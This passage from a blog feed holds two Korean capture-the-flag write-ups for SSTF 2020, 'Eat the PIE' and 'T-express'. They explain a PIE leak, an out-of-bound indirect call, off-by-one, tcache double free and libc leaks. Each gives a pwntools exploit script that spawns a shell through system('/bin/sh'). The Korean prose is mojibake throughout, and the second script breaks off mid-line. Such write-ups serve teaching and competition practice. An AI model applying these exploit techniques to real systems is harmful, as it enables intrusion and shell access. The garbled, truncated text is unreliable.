ì½”ë“œë¥¼ ì‚´í´ë³´ë©´ ìŒìˆ˜ì— ëŒ€í•œ ì˜ˆì™¸ ì²˜ë¦¬ë¥¼ í•˜ì§€ ì•Šì€ ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‹¬ì§€ì–´ indirect callì— ì‚¬ìš©ë˜ëŠ” indexì˜ out-of-boundë„¤ìš”.</p><p>ê·¸ëŸ¼ ëŒ€ì¶© ì˜ˆìƒí•´ ë³´ë©´ ì·¨ì•½ì ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>NULL terminated stringì˜ ì˜ˆì™¸ ì²˜ë¦¬ ë¶€ì¬ë¡œ PIE ìš°íšŒ</li><li>out-of-boundë¡œ eip ì œì–´</li></ol><p>ì˜ˆìƒì´ ë§ëŠ”ì§€ í•œë²ˆ í™•ì¸í•´ ë´…ì‹œë‹¤.</p><h1 id="Memory-Leak-with-printf"><a href="#Memory-Leak-with-printf" class="headerlink" title="Memory Leak with printf"></a>Memory Leak with printf</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image3.png"></p><p>PIEë¥¼ ìš°íšŒí•˜ëŠ” ë²•ì€ ê°„ë‹¨í•©ë‹ˆë‹¤. binaryì˜ base addressë¥¼ leak í•˜ë©´ ë˜ë‹ˆê¹Œìš”.</p><p>ì˜ˆë¥¼ ë“¤ì–´ func1ì˜ ì£¼ì†Œì¸ <code>0x5655574d</code>ë¥¼ leak í–ˆë‹¤ë©´ <code>0x5655574d</code>ì—ì„œ <code>func1</code>ì˜ offsetì¸ <code>0x74d</code>ë¥¼ ë¹¼ì„œ binary base addressë¥¼ êµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image4.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image5.png"></p><p>16 byte ê¸¸ì´ì˜ stringì„ ì…ë ¥í•˜ë©´ vtable ë°”ë¡œ ìœ„ì— ì €ì¥ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ìƒíƒœë¡œ <code>printf()</code> ì‹¤í–‰ì„ íŠ¸ë¦¬ê±°í•˜ë©´ <code>func1 ~ func4</code>ì˜ ì£¼ì†Œë„ ê°™ì´ ì¶œë ¥ë©ë‹ˆë‹¤. <code>printf()</code>ëŠ” NULL terminated stringì„ ë‹¤ë£¨ëŠ” í•¨ìˆ˜ì´ê¸° ë•Œë¬¸ì— NULLì„ ë§Œë‚˜ê¸° ì „ê¹Œì§„ ë©ˆì¶”ì§€ ì•Šê³  ê³„ì† ì¶œë ¥í•œ ê²°ê³¼ì…ë‹ˆë‹¤.</p><h1 id="Out-Of-Bound"><a href="#Out-Of-Bound" class="headerlink" title="Out-Of-Bound"></a>Out-Of-Bound</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image6.png"></p><p>Indirect callì— ì‚¬ìš©ë  ì¸ë±ìŠ¤ì— ë”°ë¼ ìŠ¤íƒ ìƒí™©ì„ ì¶œë ¥í•œ ì‚¬ì§„ì— ë²ˆí˜¸ë¥¼ ìƒˆê²¨ë´¤ìŠµë‹ˆë‹¤. ì¢€ ì „ì— indirect callì—ì„œ ìŒìˆ˜ì— ëŒ€í•œ ì˜ˆì™¸ ì²˜ë¦¬ë¥¼ í•˜ì§€ ì•Šì•„ out-of-boundê°€ ê°€ëŠ¥í•˜ë‹¤ê³  ì„¤ëª…í–ˆìŠµë‹ˆë‹¤. ë§Œì•½ í˜„ ìƒí™©ì—ì„œ -3ì„ ì…ë ¥í•œë‹¤ë©´ eipì— <code>0x42424242</code> ê°€ ë“¤ì–´ê°€ê² ì£ ?</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image7.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image8.png"></p><p>ì˜ˆìƒëŒ€ë¡œ ì·¨ì•½ì ì€ ì •ë§ ê°„ë‹¨í•©ë‹ˆë‹¤. ì´ì œ exploitì„ í•´ë´…ì‹œë‹¤.</p><h1 id="Exploit-Plan"><a href="#Exploit-Plan" class="headerlink" title="Exploit Plan"></a>Exploit Plan</h1><p>ì£¼ì–´ì§„ ì •ë³´ì™€ ì œì•½ ìƒí™© ë“±ì„ ê³ ë ¤í•˜ë©° ì¶”ê°€ë¡œ í•„ìš”í•œ ì •ë³´ê°€ ìˆëŠ”ì§€ ì²´í¬í•´ë´…ì‹œë‹¤.</p><ol><li><code>system()</code>ì„ ë°”ì´ë„ˆë¦¬ì—ì„œ ì‚¬ìš©í•¨.<ul><li>Arbitrary Write(AW)ê°€ ê°€ëŠ¥í•˜ë‹¤ë©´ bssì— â€œ/bin/shâ€ì„ ë„£ì–´ì£¼ê¸°ë§Œ í•˜ë©´ ë¨</li></ul></li><li>Libc ì£¼ì†Œë¥¼ leak í•˜ê¸° ë²ˆê±°ë¡œì›€ </li><li>PIEê°€ ìˆëŠ” ìƒí™©ì—ì„œ stack ì£¼ì†Œë¥¼ leak í•˜ê¸° ë²ˆê±°ë¡œì›€</li></ol><p>[ ! ] ê²°ë¡ </p><p>Arbitrary Write í•  ë°©ë²•ì„ ì°¾ì.</p><p>â€œ/bin/shâ€ì„ bssì— ì €ì¥í•˜ê³  <code>system( bss )</code>ë¥¼ í•˜ë©´ ì‰˜ íšë“ ê°€ëŠ¥.</p><h1 id="Arbitrary-Write"><a href="#Arbitrary-Write" class="headerlink" title="Arbitrary Write"></a>Arbitrary Write</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image9.png"></p><p>Arbitrary Write(Write anything anywhere)ë¥¼ í•˜ë ¤ë©´ ë‹¹ì—°íˆ ì“°ê¸° í•¨ìˆ˜ê°€ ìˆì–´ì•¼ í•˜ê² ì£ ?. ì‚¬ìš© ê°€ëŠ¥í•œ ì“°ê¸° í•¨ìˆ˜ëŠ” <code>read()</code>ê°€ ìœ ì¼í•©ë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image10.png"></p><p>out-of-boundë¡œ <code>read()</code>ë¥¼ AWì— ì‚¬ìš©í•˜ë ¤ëŠ” ì§€ê¸ˆ ìƒí™©ì—ì„œ ë„˜ì–´ì•¼ í•  ì¥ì• ë¬¼ì´ 2ê°€ì§€ê°€ ìˆìŠµë‹ˆë‹¤.</p><ol><li>callë¡œ eipë¥¼ ì¡ëŠ”ë‹¤ëŠ” ì </li><li><code>read()</code>ëŠ” ì¸ìë¥¼ 3ê°œë‚˜ ë°›ëŠ”ë‹¤ëŠ” ì </li></ol><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image11.png"></p><p>ì¼ë‹¨ ì²« ë²ˆì§¸, callë¡œ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê¸° ì „ì— ì¶©ì¡±ë¼ì•¼ í•˜ëŠ” ì¡°ê±´ì´ ìˆëŠ”ë°,</p><ol><li>í˜¸ì¶œë‹¹í•˜ëŠ” í•¨ìˆ˜ê°€ ì“¸ ì¸ìë“¤ì´ stackì— push ë¼ ìˆì–´ì•¼ í•¨.</li><li>ESPê°€ ê·¸ ì¸ìë“¤ ì¤‘ ê°€ì¥ ë‚®ì€ ì£¼ì†Œì— ìœ„ì¹˜í•´ì•¼ í•¨.</li></ol><p>ì ì ˆí•œ gadgetì„ ì‚¬ìš©í•œë‹¤ë©´ ì´ ë‘ ê°€ì§€ ì¡°ê±´ì„ ì¶©ì¡±í•˜ëŠ” ê²ƒì€ ëŒ€ë¶€ë¶„ í¬ê²Œ ì–´ë ¤ìš´ ì¼ì´ ì•„ë‹™ë‹ˆë‹¤. í•˜ì§€ë§Œ pyloadë¥¼ ë‹´ì„ ë©”ëª¨ë¦¬ê°€ 16byte ë°–ì— ì—†ê¸° ë•Œë¬¸ì— ì´ë§ˆì €ë„ ì–´ë ¤ìš´ ì¼ì´ ë¼ ë²„ë ¸ë„¤ìš”.</p><p>[ ! ] indexVar + gadget + parameter1 + parameter2 + parameter3 + &amp;read() = 24 byte</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image12.png"></p><p>í•œì°¸ ê³ ë¯¼í•˜ë‹¤ê°€ í•œ ê°€ì§€ ìƒê°ì´ ë¨¸ë¦¬ë¥¼ ìŠ¤ì¹˜ê³  ê°”ìŠµë‹ˆë‹¤.</p><p>â€œ32 bitì˜ ì¸ì pushëŠ” ì—­ìˆœìœ¼ë¡œ ì´ë¤„ì§„ë‹¤!â€ <del>ì´ë•Œ ì´ë§ˆë¥¼ íƒ ì¹˜ê³  ìœ ë ˆì¹´ë¥¼ ì™¸ì³¤ìŠµë‹ˆë‹¤.</del></p><p>ê²°ë¡ ë¶€í„° ì ìë©´ ìœ„ ì‚¬ì§„ì—ì„œ í•˜ì´ë¼ì´íŠ¸ ëœ ë¶€ë¶„ì„ gadgetìœ¼ë¡œ ì‚¬ìš©í•˜ë©´ ë©ë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image13.png"></p><p>ìœ„ ì‚¬ì§„ì€ <code>pwnme()</code>ì—ì„œ <code>read(0, &amp;v0, 0x10)</code>ì— í•´ë‹¹í•˜ëŠ” ì–´ì…ˆ ì½”ë“œì…ë‹ˆë‹¤. 3ë²ˆì§¸ ì¸ìë¶€í„° ì—­ìˆœìœ¼ë¡œ stackì— push í•˜ëŠ” ê²Œ ë³´ì´ì‹œë‚˜ìš”? ë§Œì•½ 3ë²ˆì§¸ ì¸ìë¥¼ push í•˜ëŠ” ì½”ë“œë¥¼ ê±´ë„ˆë›°ê³  <code>&lt;pwnme+198&gt;</code>ë¶€í„° ì‹¤í–‰ëœë‹¤ë©´ <code>read()</code>ê°€ í˜¸ì¶œë  ë•Œ stackì— ìˆë˜ ì“°ë ˆê¸° ê°’( <del>ì‚¬ì‹¤ ret addr</del> )ì„ <code>read()</code>ì˜ 3ë²ˆì§¸ ì¸ìë¡œ ì¸ì‹í•˜ê²Œ ë©ë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image14.png"></p><p>í…ŒìŠ¤íŠ¸í•´ë³´ë©´ ì˜ˆìƒê³¼ ê°™ì´ <code>read(0, &amp;v0, 0x566109bc)</code>ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤. ì´ ê°€ì ¯ì„ ì‚¬ìš©í•œë‹¤ë©´ 16 byte ì…ë ¥ ì œí•œìœ¼ë¡œ ë¶ˆê°€ëŠ¥í–ˆë˜ AWê°€ ê°€ëŠ¥í•´ì§‘ë‹ˆë‹¤.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<span class="hljs-comment">#p = remote(&#x27;eat-the-pie.sstf.site&#x27;, &#x27;1337&#x27;)</span>p = process(<span class="hljs-string">&#x27;./target&#x27;</span>)e = ELF(<span class="hljs-string">&#x27;./target&#x27;</span>)read_plt = e.plt[<span class="hljs-string">&#x27;read&#x27;</span>]system = e.plt[<span class="hljs-string">&#x27;system&#x27;</span>]bss = e.bss()<span class="hljs-comment"># leak binary base</span>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">12</span> + <span class="hljs-string">&#x27;BBBB&#x27;</span>p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, payload)p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)p.recvuntil(<span class="hljs-string">&#x27;BBBB&#x27;</span>)leak = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x74d</span>log.info(hex(leak))<span class="hljs-comment"># overflow vtable with gadget</span>payload = <span class="hljs-string">&#x27;-3&#x27;</span>+ <span class="hljs-string">&#x27;\x00\x00&#x27;</span> + p32(leak+<span class="hljs-number">0x970</span>) <span class="hljs-comment"># read() in pwnme() without len</span>p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, payload)<span class="hljs-comment"># arbitrary write to bss</span>payload = p32(<span class="hljs-number">0</span>) + p32(leak+bss) + p32(<span class="hljs-number">8</span>) + <span class="hljs-string">&#x27;AAAA&#x27;</span> + p32(leak+read_plt)p.sendline(payload)p.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<span class="hljs-comment"># overflow vtable with gadget</span>payload = <span class="hljs-string">&#x27;-3&#x27;</span>+ <span class="hljs-string">&#x27;\x00\x00&#x27;</span> + p32(leak+<span class="hljs-number">0x970</span>)p.sendlineafter(<span class="hljs-string">&#x27;Select &gt; &#x27;</span>, payload)<span class="hljs-comment"># system(&quot;/bin/sh&quot;);</span>payload = <span class="hljs-string">&#x27;AAAABBBBCCCC&#x27;</span>+ p32(leak+system) + p32(leak+<span class="hljs-number">0xa99</span>) + p32(leak+bss)p.sendline(payload) <span class="hljs-comment"># 0xa99 == pop pop pop ret</span>p.interactive()</code></pre><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image15.png"></p><p>Q.E.D</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>out of bound</tag>
      
      <tag>calling convention</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF T-express</title>
    <link href="/2020/10/18/fabu1ous/sstf-t-express/"/>
    <url>/2020/10/18/fabu1ous/sstf-t-express/</url>
    
    <content type="html"><![CDATA[<h1 id="ë¨¸ë¦¿ë§"><a href="#ë¨¸ë¦¿ë§" class="headerlink" title="ë¨¸ë¦¿ë§"></a>ë¨¸ë¦¿ë§</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image.png"></p><p>ì‚¼ì„±ì—ì„œ ì£¼ìµœí•œ SSTFì— ì¶œì „í–ˆìŠµë‹ˆë‹¤. ì¡°ê¸ˆ ëŠ¦ì€ ê°ì´ ìˆì§€ë§Œ T-express ë¬¸ì œ í’€ì´ë¥¼ í•´ë³¼ê¹Œ í•©ë‹ˆë‹¤. T-express ë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•˜ë©´ ì—ë²„ëœë“œ ë¡œê³ ì˜ ì•„ìŠ¤í‚¤ ì•„íŠ¸ë¡œ ì €í¬ë¥¼ ë§ì´í•´ì¤ë‹ˆë‹¤. ì½”ë¡œë‚˜ ë•Œë¬¸ì— ì–´ë”” ë†€ëŸ¬ ê°€ì§€ë„ ëª»í•˜ê³  ìˆì—ˆëŠ”ë° ì˜¨ë¼ì¸ìœ¼ë¡œ ì—ë²„ëœë“œì— ê°€ë³´ë„¤ìš”. ã…ã… </p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image1.png"></p><p>T-express ë°”ì´ë„ˆë¦¬ëŠ” glibc-2.31ì™€ í•¨ê»˜ ì£¼ì–´ì§„ Heapë¬¸ì œì…ë‹ˆë‹¤. glibc-2.31ëŠ” 2020ë…„ 2ì›”ì— ë¦´ë¦¬ì¦ˆ ëœ ë²„ì „ì¸ë°,  ì €ëŠ” T-expressë¥¼ í’€ë©´ì„œ ì´ ë²„ì „ì˜ tcacheë¥¼ ì²˜ìŒ ì ‘í•´ë´¤ìŠµë‹ˆë‹¤. ì´ëŸ° ì €ì¡°ì°¨ ì–´ë µì§€ ì•Šê²Œ í’€ë§Œí¼ í¬ê²Œ ì–´ë µì§€ ì•Šê³  ì¬ë°Œê²Œ í’€ ìˆ˜ ìˆëŠ” ë¬¸ì œì…ë‹ˆë‹¤.</p><p>[ì·¨ì•½ì ]</p><ol><li><p>Off-By-One</p></li><li><p>Double-Free</p></li><li><p>Out-Of-Bound</p></li></ol><h1 id="í›‘ì–´ë³´ê¸°"><a href="#í›‘ì–´ë³´ê¸°" class="headerlink" title="í›‘ì–´ë³´ê¸°"></a>í›‘ì–´ë³´ê¸°</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image2.png"></p><p>í”„ë¡œê·¸ë¨ì˜ ê¸°ëŠ¥ì€ ëŒ€ì¶© ì•„ë˜ì™€ ê°™ì´ ìš”ì•½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li><p>í‹°ì¼“ êµ¬ë§¤</p><ul><li>One Ride í‹°ì¼“ â†’ ë©”ëª¨ë¦¬ í• ë‹¹</li><li>One Day í‹°ì¼“ â†’ ë©”ëª¨ë¦¬ í• ë‹¹</li></ul></li><li><p>ë³´ìœ  ì¤‘ì¸ í‹°ì¼“ ë³´ê¸°</p></li><li><p>í‹°ì¼“ ì‚¬ìš©</p><ul><li>One Ride í‹°ì¼“ â†’ í• ë‹¹ í•´ì œ</li><li>One Day í‹°ì¼“ â†’ í™œë™ ì„ íƒ â†’ ëª¨ë“  í™œë™ ì‚¬ìš© â†’ í• ë‹¹ í•´ì œ</li></ul></li><li><p>ì¢…ë£Œ</p></li></ol><h1 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image3.png"></p><p>êµ¬ë§¤í•  ìˆ˜ ìˆëŠ” í‹°ì¼“ì˜ ì¢…ë¥˜ëŠ” ë‘ ê°€ì§€ë¡œ ë‚˜ë‰©ë‹ˆë‹¤(One Ride Ticket / One Day Ticket). ë‘ í‹°ì¼“ì€ 3ê°€ì§€ ì°¨ì´ì ì´ ìˆìŠµë‹ˆë‹¤.</p><ol><li>í• ë‹¹ í¬ê¸°<ul><li>One Ride â†’ 0x18</li><li>One Day â†’ 0x30</li></ul></li><li>í‹°ì¼“ íƒ€ì…<ul><li>One Ride â†’ 1</li><li>One Day â†’ 0</li></ul></li><li>í•´ì œ ì¡°ê±´</li></ol><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image4.png"></p><p><code>0x55d222efe2a0</code> ì—ëŠ” One Ride Ticketì´, <code>0x55d222efe2c0</code> ì—ëŠ” One Day Ticketì´ í• ë‹¹ë¼ìˆëŠ” ëª¨ìŠµì…ë‹ˆë‹¤. í•˜ì´ë¼ì´íŠ¸ ëœ ë¶€ë¶„ì„ ë³´ì‹œë©´ <code>ticket_type</code>ê°’ì´ ì €ì¥ëœ ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.  ì—¬ê¸°ì„œ ì§‘ì¤‘í•´ì•¼ í•  ì ì€ <code>lastname</code> ë°”ë¡œ ë‹¤ìŒì— <code>ticket_type</code>ì´ ì¡´ì¬í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image5.png"></p><p><code>lastname</code>ì€ í‹°ì¼“ì´ í• ë‹¹ëœ í›„ í•¨ìˆ˜ <code>read_str()</code>ìœ¼ë¡œ ì…ë ¥ì„ ë°›ìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image6.png"></p><p>í•¨ìˆ˜ <code>read_str()</code>ì€ ì…ë ¥ë°›ì€ string ëì— NULLì„ ì¶”ê°€í•˜ëŠ” ë£¨í‹´ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ë§Œì•½ <code>lastname</code>ì— ì…ë ¥ë°›ì„ ë•Œ 8byteë¥¼ ê½‰ ì±„ì›Œ ë„£ëŠ”ë‹¤ë©´ <code>ticket_type</code>ì˜ ê°’ì„ ì˜¤ì—¼ì‹œí‚¬ ìˆ˜ ìˆê² ì£ ?</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image7.png"></p><p>One Ride Ticketì˜ <code>ticket_type</code>ì„ NULL(0x00)ë¡œ ì˜¤ì—¼ì‹œí‚¨ ëª¨ìŠµì…ë‹ˆë‹¤. ê·¸ë˜ì„œ ì´ê±¸ë¡œ ë¬´ì–¼ í•  ìˆ˜ ìˆëŠëƒ? <code>ticket_type</code>ì„ ì˜¤ì—¼ì‹œì¼œ 0ìœ¼ë¡œ ë°”ê¾¸ë©´ One Ride Ticketì„ One Day Ticketì¸ ê²ƒì²˜ëŸ¼ ì†ì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image8.png"></p><p>í•¨ìˆ˜ <code>use_ticket()</code>ì˜ ì¼ë¶€ì…ë‹ˆë‹¤. <code>ticket_type</code>ì— ë”°ë¼ ë¶„ê¸°ë¬¸ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì½”ë“œê°€ ë‹¬ë¼ì§‘ë‹ˆë‹¤. One Ride Ticketì—ëŠ” ì¡´ì¬í•˜ì§€ ì•ŠëŠ” <code>meal_ticket, safari_pass</code>ë“±ì˜ ê°’ì„ ì¡°ì‘í•˜ëŠ” ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆê³  ì´ëŠ” ì¶”ê°€ë¡œ ë©”ëª¨ë¦¬ ì˜¤ì—¼ì„ ë°œìƒì‹œí‚µë‹ˆë‹¤.</p><h1 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h1><p>glibc-2.31 ë²„ì „ì˜ tcacheëŠ” double freeë¥¼ ê²€ì¦í•˜ëŠ” ì½”ë“œê°€ ì¶”ê°€ ëìŠµë‹ˆë‹¤. ì—¬ê¸°ì„œ ì¬ë°ŒëŠ” ì ì€ í¬ê¸°ê°€ ê°™ì€ tcache ë¼ë¦¬ë§Œ ê²€ì¦í•œë‹¤ëŠ” ê²ë‹ˆë‹¤. ë§Œì•½ ì²­í¬ì˜ sizeë¥¼ ì„ì˜ë¡œ ì¡°ì‘í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì´ ìˆë‹¤ë©´ ê°™ì€ ì²­í¬ë¥¼ ë‘ ë²ˆ í•´ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image9.png"></p><p>One Ride Ticketì˜ <code>ticket_type</code>ì„ <code>0x00</code>ìœ¼ë¡œ ë°”ê¿” í•¨ìˆ˜ <code>use_ticket()</code>ì—ì„œ One Day Ticketì¸ ê²ƒì²˜ëŸ¼ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤ê³  ì„¤ëª…í–ˆìŠµë‹ˆë‹¤. ê·¸ì¤‘ <code>meal_ticket</code>ì„ ì‚¬ìš©í•˜ë©´ ë‹¤ìŒ ì²­í¬ì˜ sizeê°’ì„ ì˜¤ì—¼ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image10.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image11.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image12.png"></p><p>ìœ„ì—ì„œ ì„¤ëª…í•œ ëŒ€ë¡œ sizeê°’ì„ ì˜¤ì—¼ì‹œí‚¨ ëª¨ìŠµì…ë‹ˆë‹¤. One Day Ticketì„ sizeê°€ 0x41ì¼ ë•Œ í•œë²ˆ, 0x21ì¼ ë•Œ í•œë²ˆ í• ë‹¹ í•´ì œë¥¼ í•´ì£¼ë©´ Double Freeê°€ ë˜ê² ì£ ?</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image13.png"></p><p>ì§ ! ê°™ì€ ì£¼ì†Œê°€ ë‘ ë²ˆ í•´ì œë©ë‹ˆë‹¤. ì´ì œ ì›í•˜ëŠ” ì£¼ì†Œì— chunkë¥¼ í• ë‹¹í•´ Arbitrary Writeë¥¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="Out-Of-Bound"><a href="#Out-Of-Bound" class="headerlink" title="Out-Of-Bound"></a>Out-Of-Bound</h1><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image14.png"></p><p>êµ¬ë§¤í•œ í‹°ì¼“ì€ <code>passes</code>ë¼ëŠ” ì´ë¦„ì˜ ë°°ì—´ë¡œ bssì˜ì—­ì— ì €ì¥ë©ë‹ˆë‹¤. ê° í‹°ì¼“ì— í•´ë‹¹í•˜ëŠ” chunkì˜ ì£¼ì†Œë¥¼ ì €ì¥í•˜ê³  indexë¥¼ ì‚¬ìš©í•´ ì ‘ê·¼í•©ë‹ˆë‹¤. ìœ„ ì‚¬ì§„ì€ í•¨ìˆ˜ <code>view_ticket()</code>ì˜ ì¼ë¶€ì…ë‹ˆë‹¤. ìì„¸íˆ ë³´ì‹œë©´ indexë¥¼ ê²€ì‚¬í•˜ëŠ” ë¶„ê¸°ë¬¸ì—ì„œ ìŒìˆ˜ì— ëŒ€í•œ ì˜ˆì™¸ì²˜ë¦¬ë¥¼ í•˜ì§€ ì•Šì€ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image15.png"></p><p>ë§Œì•½ <code>passes</code> ë³´ë‹¤ ë‚®ì€ ì£¼ì†Œì— ì¤‘ìš”í•œ ì •ë³´ê°€ ìˆë‹¤ë©´ Out-Of-Boundë¡œ ì¶œë ¥ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  ë°°ì—´ <code>passes</code>ë³´ë‹¤ ì¡°ê¸ˆ ë‚®ì€ ì£¼ì†Œë¥¼ í™•ì¸í•´ ë³´ë©´ <code>stderr@@GLIBC</code>ê°€ ìˆë‹¤ëŠ” ê±¸ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image16.png"></p><p>í•¨ìˆ˜ <code>view_ticket()</code>ì— -4ë¥¼ indexë¡œ ì…ë ¥í•œë‹¤ë©´ <code>stderr@@GLIBC</code>ë¥¼ í†µí•´ libcì˜ base addressë¥¼ leak í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<span class="hljs-comment">#p = remote(&#x27;t-express.sstf.site&#x27;, &#x27;1337&#x27;)</span>p = process(<span class="hljs-string">&#x27;./target&#x27;</span>)e = ELF(<span class="hljs-string">&#x27;./target&#x27;</span>)<span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><span class="hljs-comment">#gdb.attach(p)</span><span class="hljs-comment"># init</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">&#x27;AAAA&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">&#x27;BBBB&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;BBBB&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">&#x27;CCCC&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;CCCC&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<span class="hljs-comment"># leak libc</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;-4&#x27;</span>)p.recvuntil(<span class="hljs-string">&#x27;|name |    &#x27;</span>)pad = u64(p.recv(<span class="hljs-number">4</span>)+ <span class="hljs-string">b&#x27;\x00\x00\x00\x00&#x27;</span>)p.recvuntil(<span class="hljs-string">&#x27;   &#x27;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+ <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)libc_base = leak<span class="hljs-number">-0x1ec643</span>log.info(hex(libc_base))free_hook = libc_base + <span class="hljs-number">0x1eeb28</span>log.info(hex(free_hook))system = libc_base + <span class="hljs-number">0x55410</span>log.info(hex(system))<span class="hljs-comment"># double free</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span 